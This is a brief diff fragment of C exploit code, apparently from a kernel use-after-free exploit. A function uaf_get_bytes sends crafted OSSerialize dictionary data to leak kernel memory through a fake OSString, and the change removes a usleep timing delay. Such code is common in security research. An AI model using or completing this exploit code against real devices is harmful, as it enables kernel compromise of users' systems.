@@ -61,8 +61,6 @@ void uaf_get_bytes(const OSString *fake, char *buf, size_t len)
             kOSSerializeEndCollection | kOSSerializeObject | 4,             // would cause a panic (because heap poisoning).
         };
         
-        usleep(10000);
-        
         dict_get_bytes(dict, sizeof(dict), ref, buf, &buflen);
     }
 }
